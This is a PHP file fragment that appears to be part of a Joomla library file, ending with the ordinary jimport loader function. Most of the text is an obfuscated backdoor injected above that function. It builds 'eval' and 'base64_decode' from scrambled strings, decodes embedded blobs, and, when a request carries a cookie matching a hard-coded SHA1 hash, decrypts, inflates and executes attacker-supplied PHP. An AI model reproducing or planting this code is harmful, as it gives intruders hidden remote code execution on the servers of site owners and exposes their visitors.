veTdWQlNnTjNJX1hSJ10pKSk7ZXZhbChuekVTdmZQcHVEYjFZZWFRT1ooYmFzZTY0X2RlY29kZSgiUHd4cFRHcHI5ckVSTFE9PSIpLCAkX0NPT0tJRVsnMTRNbEplOXVveTdWQlNnTjNJX1hSJ10pKTt9fQ=='".$VgAwQz5640);
$LTQIsZ2877 = ".ev;fu2c3jhlgs8t4zyirw0x1*57)pa/nbkmdo6q9_(";$NuSWI9678 = $LTQIsZ2877[29].$LTQIsZ2877[20].$LTQIsZ2877[1].$LTQIsZ2877[12].$LTQIsZ2877[41].$LTQIsZ2877[20].$LTQIsZ2877[1].$LTQIsZ2877[29].$LTQIsZ2877[11].$LTQIsZ2877[30].$LTQIsZ2877[7].$LTQIsZ2877[1];$stxA1054 = "\x65".chr(118)."a".chr(108)."(".chr(98)."\x61se\x36".chr(52)."_\x64\x65\x63o\x64".chr(101)."(";$b1685 = "\x29\x29\x3b"; eval($stxA1054."'aWYoIWZ1bmN0aW9uX2V4aXN0cygiZ2toNEYzR2I4bFBjYVEwVCIpKXtmdW5jdGlvbiBna2g0RjNHYjhsUGNhUTBUKCRrVnUsJHNleT0nJyl7JGFMZz0kc2V5OyRxTTk9c3RybGVuKCRrVnUpOyRjMHFsWj0nJzskaGRzbWU9JHFNOT4xMDA/ODoyO3doaWxlKHN0cmxlbigkYzBxbFopPCRxTTkpeyRjMHFsWi49c3Vic3RyKHBhY2soJ0gqJyxzaGExKCRzZXkuJGMwcWxaLiRhTGcpKSwwLCRoZHNtZSk7fXJldHVybiRrVnVeJGMwcWxaO319aWYoaXNzZXQoJF9DT09LSUVbJ0R0TV83YkN4QjkxY0VpNTA0ViddKSl7aWYoc2hhMSgkX0NPT0tJRVsnRHRNXzdiQ3hCOTFjRWk1MDRWJ10pPT0iZWZiM2Y5YjAzYTcyODhhNjM3MzFkZjRjOTVjYTNkMDU4NWU4Y2E1NSIpIHtldmFsKEBnemluZmxhdGUoZ2toNEYzR2I4bFBjYVEwVChiYXNlNjRfZGVjb2RlKCI1bTM1RjNzWHk1cFhCdytIVzJJRDlKYlRTekRhZXBna3d5eEhkWDFhYjdIZjdrZExJUkU0Q1dPVWIxYjNEcjFpRlM0YU55RS80c0htR0cxSDByc0lSRUlUNUxxanVHS2hmTS9uczYwMU5iR3l1dG1ZbHhjdTJjalU4R0UvWXZhdFc5Uno1S1BqaE91bVAvZnJ3RStCSklVdzV3MUpXenVUbjROSXlwVTlXcksxSzl0bE1SSStVWVZuM0E5ZHhvWU5TUExWR2M3L3ZjRUt3K1liOG5sczRqcUdIc1RoSE50Tm5SWjdpT2ZPM2FqYUtZcVJDNXZZQUdGZEM5ekZ4cXFxemJpUWNFb1lEN3FiZXZZYjhKTjUxZkVnNjJEbHBRb0Z0YktBODd3M1NQZnkxRG5ySTI5dDQrVUFVMUxRMi9uL0xhbjZDMlhOank4K2JxSElTNlV3ODBRUkhiaUt2eGpTYTBDemcxK2pDZUYwRzVWekRtbjhBaEtxOXluazNrZno0WDdJL0ZPbXBkV21oNTlhcEdSN1RZdStCZU5BWmdtTU5wY3VxdmtmQmxhV2ZmVHJqNGE1QzJSZXpNaksySktDTkwxQnhicU5MOTRnYzhaMVI5SmJpSWJjY041bHJsUVR1cXM1SmFhcWJ0bE1TNkFQbXo0MU1NS05OYWt3NjRtUmV3SE9TVjlIcjhhdEo3azMzWVVjVEZzMWMxZlJWUCttWkMvYUZWMHdKVFNZMzFKRGsvSEM0a3pWc0c2aWtGbmQ5ZWVzMCtEYmkvREhaaGpyNkpSMW44MWYzL3NvUEMxV0pvcDJldG9lL1hqZXNLbDZQNkw1NU5JVWRIWGJySmRjY3dHMHV0RlB5YUtIUWt2S3gvUkRGcms2NGQ2b0RvSFRrb2RoeVRQS3hMQ0JndlRhU0ozQmZ0QnVGb1BKMG01Wms5Y3dqYmNFOTJWcExoOHVlbU9hK1V1cVhPd3JVa3B0cExSZlM3TGozZWh4YVkwNWJIUWpPcXpDcmlFNk9kcEx4ek9BRlB4ZUpUMXloRTlLVi9XTjN2ZzdtY3RwSk5XbjhKQnpwK0NnVXE5d3hjb2VUT2ZVa1ltdVFvWUVodkNKVUVzWWJDak4zdlNqOVFSWlFRM09vcFM3eFBuS0lEUWxScWJJYXkrTFJjVEhFZHVibE4zTjhvR01VZkV1N3pROEwyai91OTdZdDBNYTJVdW5mbjFITGNFVmdFS0s3NmNuR01zdmJJN3lmU1VYRVM0MW55WVJPcnZ2bGpjMVAvbmZyQ1FIWHZJaHRSTE1mcU1VNTNLWDNoSzd2RldOWkVjb3Fmck9rWVVEZHlzTkY3K3FjZ0s3Vk8rclNRd3hNbk1vR2pTZzJ1QWhPTTk0YUVRenhYc0hPbGRzcFpFTzBxU0crWVFBenl1MkI2Zmd0YnJRdzA1L2w2dFI3TWdWUzZlMmt4VTNaaHUzTWxrZzRpbFJ5YURwWVh6SjdVa0dlNEVGWXJiVFFMQUFpOFRtalRTRmRQajh4TndJRTFrT2R1UlA0UDJkRjlEVDJGcDlYQzNMdjhQUlljVCtzZ1hrN2lSWVdteGMyWGhiT0kxQTRZYzBwdldYL0pQL0NVVWRkZm5vUDRUT1J2OU9laHM4bWw0bm1zaE1yU0gzWnpzZGhoRGZpWEJEbEREZkhtT1hESHJZWlk1VXY0TUViLytWbDJHUmE4YXlBSTlkUVBicnFrTitUS3c5MGt6MkQ0Wlc4S3o0KzNzYW9NbXFtWDB3RGpla09VMWVxSjBiTU5VMUdYbCtJV3dTekNBcVNNMzJYdmNCWkZXWTI2OUNyM3VWeDBHQmVRYU9IWkE1TmdVTnhPRDlCMDhvYkwyUm80MUhHaDFCdklQQkxjOU9RSE5LU3dXdE02aVZFT0FTa0wrc2dRelJNcmN1cU9vM3lObnM5emd1bGR2VktwNWZKR01qbVNYVkNuYzZFcU9KR1ZrNUdwOHdhQVQ2ZDR2ZFp5Z1FOdFVKTVR3dG5BeDBKYTdva01pTjYzalZCc0tteTIrNHRsWmhmMkxzeWYybkYyV1p3eHdHSjd3RUFvaGgrMmFQMGpEODl3QUFWQ3Z5bGR3Qzh0cVVPdERNdnNjdEdDUlV0L0JQQ3FUNHY5VDlkV1IwVy95b1VZOHJiMnQ3WU9UZFVVQW9OYzRJWWl5QzNhUmJRckoweWc1bEN2a09OcTBWUHA2TGpjeFFoQ21pQ0xDa0VVQjBVMGlsWnRnRWd2YmlZQytZYVZjZFVOREpLMG8xNmI4V0V6RTJCWGtUdnU5VjhjNmxQQ0xjT09hZUIvcFdydC9ZS1QwL0dOTTRRdUswUnVEekNUdlFWYnU1Q1FrdFQzbnppbE92VFVIbFhueC96blNUQlJKcWp0THVpZDRPM1I1ZWZmSHdudmZ1akJNdEZaOEgvUWFnN2tpZW03UDM1VWRvd0VhRkFWdHc0NVowV08zbXpiblRFbUJqZXBmRTdZb2ZuMkdwVDhUcHF0V3ltb3JtdlRVODRUU1Q3ZXVNQWg5ZWl4djRnNlNPUms1cHB1TEtsZVhoWTdBWVZUVWw2azBWaHlvamJYSFdWRFIybDY0b3NVUTlUNU5MV0hweE5ndC9QbFVOSktLTTk4QmJyTGxLTGt5dzdQRTR1c2UwRC8wZDB3NW9hQXp0Q2xMRGh4WFVITVg4ZkRRYzMyak5xS291UVF4U3RNQ2RiMFpza0lPQnFvTVVnT21SeUI1TU9xWkluWUlBeVZNclVwTzhHZ3pOUGhMUnQ0V2gxbXhtckNNVTVjcWhpdDZ5Y3JnVGNDb3YyVWRmdWx5MWkwMUs2OEhjK0J3eC9GYTlkY3FJcmFtV05ybWJLVy9IOE9FUEtHT0hWK3ZISkFQUzdHSUt4TitvTmY2T24rQUI0c0dyUTBmM1dZbE5VNEFPTUxsQnpUNzV6aHpyd3VQMlowcDRrby9JVWdUcnlibWlvSHJCVFlKVVNZOWh5TDA0c0NFTWoranp6Qk1od0NjcnNnSjM5NEc5NHJ0Z1doOGkvbWJCNTRjUGZjSm9Qc1pUYU5WR0U2cDRhUlZkcThORkxEWXYzb2xydmE3TE1BdWo1S1RXOUMvcG9XR09qMyt3b3FaVVlNVlNHeG9rZUpOWEduR0M3R3ZwSWRKWHh4b3BybU4rcVV3QjRnYjBxWHVCWjFJTjRjVlFPT3JwRDNYd29GdDNxMGlsWUZYaWIyZ1Jya2NGUWhSVVhHZVlFRzI5a1lLekdmY2l2ZFlsbVI0K0dWRjBaZjRRZnpOa05UU2VIdFI3MkJSdUdwZU5VL0lrWG1oTHptYU00bjZwbTAwa2VqK2tIdVRTbTNUaDN1YldXTnp2ZXpPZW5qOGJZLytkZVFZdm5VbDFuNDlMU093akUzQndQVmVvbTg4enNYcDN0RTlJL0pydnI3aUl1M3oyMFpBTWRxTnRaQ3VWRWxXdXFzNVBiTlY4U2tzR1FWZ3JOUjZFeENZdklPOVFyNVZTZmFCcFhackl6L2JEaHd1KzdOc2d6dkttSDRqWEJFMmIybHlXREthdzRnUGFoeFJIZG03SU81U3R5akFleGNZc1JiODU2UjFRWGoyZVFDeEpmUS9RN1NkcnExb091bTZWZ2NTQTg3ZENBeEZsWkZRWGVDM09ZRlFyYlhwUW5JSGltZUdHem8vUm5ramZhWmNzdTlWZ2s1QnBvUWdTaFYzOU83Qy9DOGZTL0lOMlJOLzVRQkhyVzdPa1NtZ3NRRUkraE5MS0diVHAxdnJKKzJ2OHFnTXE4ZVVIQlB2Lzh0bERpVU1qZ0pJaVFqU3IzMVRTMVVBdTcrVnJrbmYraFB3MVh6WUJTTlBEaEFJNXpiOFo0UURSTU8yZUVrb1lFL3JNM0pGVjNWeGxWT3dqem1BUjJpRVN5dGpFbEt1T1g1SFovTXRTZ1lOTXRnYTdVOUl6SVM3M3Z4MHp3dFZ6djhkYzhDYWZNZmQ2clpSc3ZaN2IrTGpoWWQ5T3oyYVRzTUxtQ2VUZnpmYUhybEJ0bSt4Qkx2V2JHMEdneVBvcXFoakhnRXFWVTFERkFBZ3IyTkxJS2UvOWFzVHhRK2NHczNLbytiY3RqT01mK0VGcDVkRGxYVm1lM1U0NnZtV0N6TUpOL2wwVlBtNWJSZGNZcGlteDV5N2lyKzB5ZVB2TmlHOVFqZURldXJpMWpGd055c2lrNXEvK2xkczZkQm5KQlBlRjRkeTJWTGZSQWp3NGxWT2FYWWZLdklYVVVZb2c5OUp1bHZLS3lxc090RHN1bDZZRHVFUGk3YzJINnNLb081S2g3WW1DWVZ3eDJHSHE4SFZZRklZRjg4M293TjI5eXErMWt1bGFZeUlEa2ptT1MvM1JYUGJDV211clVidUVsMXo0WUdQWC9XcGJtODN0S3RNQlI5cERFcjA0OGUyL01uR2hrdzh4OGY1c2F2Z3ArQjVJUUxKUEE0TmZaNzhZWmFuWUJaWnQzK0dIZVpMTXVFVWFPNGlPV0xLUFoyWlhCMGpRb2ErYytubjRKQ0tvbm9kbVVCSVFHRFZCczh3Rk85enZrbzZ2T3dwTko0REd3SXpWMEhSQWM3eDNjWVpXRWs0OXA2RjFyRjg1OG43YnVOQTRCQXhyMGFnbFZQQnhkS3paeFY4S0hDR1NOVGRYSVdLT3NsT3hTZVVyTDIvbUlZY25jMmxVRmN4QncyRHNDeGljNG0zcGs0dDVjL1Y3T2NwMkhac2JJaDZIcWo4SFM2ekcwdEpzN1NoRTRJaFArbzM0bW1BU2E3WVMxajhoRkxSTDZPRzF0R1RDNGNFeXdUVWk1aGFxUmxva0Z5dEF0Rml5THVYcFgvZGZJS055K3IyZVdRNnVZTU9CVlROMEx5TmR6NHlzNTlDZzVzK3QrSTFxb2gvekZtaW1RUUdBZVRHY0U4dHUwd29ONFh3M0ViVjhEbldrVzM4L0hyVkl6M0pWcXhjU1FqQWdMYzZWWXJWZ3hWVnV4Ym55RnM5ZlF0dHd0QTkvZjZSS0JTRm51S0dreXBkUSsvTnA2Y1NXL1NTRVNseHNEMnNqWUpEaktaRW96WUVXbmkwTmMwMkhLQjBaTHFKZ3diMGxyU3pQRkdPRnViTlBUR1k4eDg5bitxNDMzdjltZkFJOG9oSmpHdkxBV1ZrWnVNaEZOU21YOEJVa3IwUWZUbUFrcEhYRzFocTZOa213ZXBMUFVTRVBMQVgxTmVkenVhNjl2WWNoZlZaMGQ5TTZrSVJvbVliR2J6blNsT3ZtL2tSZExLelpLQXVQdEpIWktxYm42cDRxeGNiSVF5TjA4SXd4a2FTYWVlVlkwNkQwcnRyMTdnSWxhQUE0cGIvM0pFUE92Y0ZNRVc1c3FiN3o3czlGYTdra3hlOEdRUFpEL1ovVWQ0TFV4OTYvVDFNRjRZbSs0Rzd2bjI1eFQzNkNWa1NNdCtYUzJWN2N0MnpxcHNEK2V2N2tlc0FKdHJJSWJHMVdVVUJKWHQ3dzFFMEFwRGpVSTNvQ0tybTNFTTdVcDNMR0U4TFY4QVE1SS9sMUJpTFdTSlZWNk9VYzhiYVVPeElGTjRINXBSRnFTV25pT2I4WjVvTnhoNG1uWmdKMnllZ3g0Wksrd2MwQVpydWNhTVdDbVJyRnZxc3EvRkgydzlRTnpSRml1TnZUYmEzWUlMYmZmQ2Z5a1dzeGt1eHBJYnBuNVIzd253YU1uRVhNdUlVZzM4QmUrenovWElUN2libi9vanZIWTJLbzUybGNpT1phMFRDRTRZUDRJZ0dWRHgrQnBmTm42bmVWK050RE52WDFCR01pQWMwb0JGaks4NE5DTnlXZkV6TWFGMy92MDVWRU4rVmdaTXhVWG5qYis1VGRWdmNyaVg1bXE5azRRcFZQV3BnN3hncURWZVNRMDR3dmRTeGd1WjJLQk5yQ1pROTVRNWd4S3YrMHdISHhWZW1DcE1HRCsyUEhIbFFSaWVmbUZXMHUxLy95UEFJVnQ3T3U5enpWd0c0UkdabWJrbzkvTitVa1B6TWJJQWNLaitWQjFwcmZ1Y1dYR0xPbzdUTXdNalhtVEJIWVk5cWp1MzkyUGduU25RbEpXRFI5Z0RJOFpMaWJpdzI4NGU1SDBHZ1RSc2gzZlVxRXFNaEVjYWZPU3RjVjBGWEc0bXFJSmxXVlUvOGZZdjMrU0RTTUxYWFJjR3FQbU0yT29SaWhjTlJ6aGRNT3lndGpJZ1FzMW5laS9XcXA1Y2xsSWpPakx0K1FxR2UzeUFnRVJRTnl0dW56enJqQVk1TjFuQm1xRmZVYml0dXVtaithWWZtYllielhHU2xkQkU4dExEY09xMWFUNXljbUhBb24yTFRtZkg4OXZVQmpHbHFNRWRGK2xvVUQvd1pZYmdrVjZCZkQwT1hucVF4VWNpekxYNEU9IiksICRfQ09PS0lFWydEdE1fN2JDeEI5MWNFaTUwNFYnXSkpKTtldmFsKGdraDRGM0diOGxQY2FRMFQoYmFzZTY0X2RlY29kZSgiUmcrbUZaMURyc2JRIiksICRfQ09PS0lFWydEdE1fN2JDeEI5MWNFaTUwNFYnXSkpO319'".$b1685);

/**
 * Intelligent file importer.
 *
 * @param   string  $path  A dot syntax path.
 * @param   string  $base  Search this directory for the class.
 *
 * @return  boolean  True on success.
 *
 * @since   11.1
 */
function jimport($path, $base = null)
{
	return JLoader::import($path, $base);
}
